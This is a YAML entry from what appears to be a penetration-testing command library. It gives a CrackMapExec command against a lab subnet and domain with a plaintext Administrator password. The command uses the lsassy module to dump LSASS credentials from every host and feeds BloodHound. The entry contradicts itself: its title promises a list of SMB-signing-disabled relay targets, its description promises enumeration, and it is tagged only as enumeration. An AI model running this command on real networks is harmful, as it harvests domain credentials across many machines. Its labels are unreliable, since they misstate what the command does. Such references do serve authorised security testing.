---
title: |
  Create a list of targets with SMB Signing disabled (required to relay)
description: |
  "CrackMapExec (a.k.a CME) is a post-exploitation tool that helps automate assessing the security of large Active Directory networks." - https://github.com/byt3bl33d3r/CrackMapExec/wiki. This command will enumerate domain groups, local groups, logged on users, relative identifiers (RIDs), sessions, domain users, SMB shares/permissions, and get the domain password policy. Create a list of targets with SMB Signing disabled (required to relay).

  Command Reference:

  	Target: 10.0.0.0/24

    Domain: test.local

    User: Administrator

    Password: Welkom01!

    Method: lsassy
command: |
  crackmapexec smb 10.0.0.0/24 -d test.local -u Administrator -p Welkom01! -M lsassy -o BLOODHOUND=True NEO4JPASS=bloodhound
items:
  - Username
  - Password
services:
  - SMB
OS:
  - Linux
attack_types:
  - Enumeration
references:
  - https://github.com/byt3bl33d3r/CrackMapExec
  - https://github.com/byt3bl33d3r/CrackMapExec/wiki
---
